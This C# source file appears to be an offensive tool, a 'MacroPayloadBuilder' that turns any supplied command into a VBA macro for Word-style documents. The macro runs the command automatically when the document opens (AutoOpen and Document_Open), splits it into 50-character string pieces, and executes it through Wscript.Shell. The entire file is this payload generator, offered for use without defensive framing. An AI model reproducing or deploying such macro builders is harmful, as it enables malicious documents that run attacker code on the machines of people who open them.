using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace MacroPayloadBuilder
{
    internal class Macro
    {
        public void generateMacro(string fullCommand)
        {
            int n = 50;
            Console.WriteLine("\nHere is your Macro:");
            Console.WriteLine(new string('*', 100));
            Console.WriteLine("\nSub AutoOpen()");
            Console.WriteLine("\tMyMacro");
            Console.WriteLine("End Sub\n");

            Console.WriteLine("Sub Document_Open()");
            Console.WriteLine("\tMyMacro");
            Console.WriteLine("End Sub\n");

            Console.WriteLine("Sub MyMacro()");
            Console.WriteLine("\tDim Str As String");
            for (int i = 0; i < fullCommand.Length; i += n)
            {
                Console.WriteLine("\tStr = Str + \"" + fullCommand.Substring(i, Math.Min(n, fullCommand.Length - i)) + "\"");
            }
            Console.WriteLine("\tCreateObject(\"Wscript.Shell\").Run Str");
            Console.WriteLine("End Sub");

            Console.WriteLine("\n");
            Console.WriteLine(new string('*', 100));
            Console.ReadLine();
        }
    }
}
